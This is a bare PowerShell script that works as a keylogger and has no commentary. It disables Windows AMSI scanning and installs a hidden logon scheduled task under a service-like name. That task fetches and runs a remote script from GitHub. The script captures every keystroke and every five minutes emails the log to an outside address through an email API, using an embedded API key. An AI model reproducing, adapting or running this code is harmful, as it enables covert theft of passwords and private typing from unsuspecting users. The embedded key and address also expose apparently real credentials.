$c=@{k='re_E5RqtiUa_DGW5Anr6waHxtoJ4Zexay5EB';t='ellgono_9@hotmail.com';u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1';m=5;n='WinSvcHost'}

$mx=New-Object System.Threading.Mutex($false,"Local\$($c.n)")
if(-not $mx.WaitOne(0)){exit}

$ab="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',40).SetValue(`$null,`$true)"
$cmd="powershell -NoP -W Hidden -C $ab;iex(irm '$($c.u)')"
schtasks /create /tn $c.n /sc onlogon /f /tr "$cmd" | Out-Null

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Wk7 {
  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
  [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] s);
  [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint v, uint sc, byte[] s, StringBuilder b, int n, uint f);
}
"@

$sb=New-Object System.Text.StringBuilder 64
$ks=New-Object byte[] 256
$dn=@{}
$sp=@{8='[BKSP]';9='[TAB]';13="`n";27='[ESC]';46='[DEL]';37='[<]';38='[^]';39='[>]';40='[v]'}

$t0=Get-Date
$buf=''

while($true){
  for($k=8;$k -lt 255;$k++){
    if([Wk7]::GetAsyncKeyState($k) -band 0x8000){
      if(-not $dn[$k]){
        $dn[$k]=$true
        if($sp.ContainsKey($k)){ $ch=$sp[$k] }
        else {
          [void][Wk7]::GetKeyboardState($ks)
          $r=[Wk7]::ToUnicode([uint32]$k,0,$ks,$sb,64,0)
          $ch=if($r -ge 1){$sb.ToString()}else{''}
        }
        if($ch){$buf+=$ch}
      }
    } else { $dn[$k]=$false }
  }
  if(((Get-Date)-$t0).TotalMinutes -ge $c.m -and $buf.Length -gt 0){
    $b=@{from='onboarding@resend.dev';to=$c.t;subject="$env:COMPUTERNAME $(Get-Date -f 'dd/MM HH:mm')";text=$buf}|ConvertTo-Json -Compress
    try{ irm 'https://api.resend.com/emails' -Method Post -Headers @{Authorization="Bearer $($c.k)"} -ContentType 'application/json' -Body $b -TimeoutSec 20 | Out-Null }catch{}
    $buf=''; $t0=Get-Date
  }
  Start-Sleep -Milliseconds 12
}
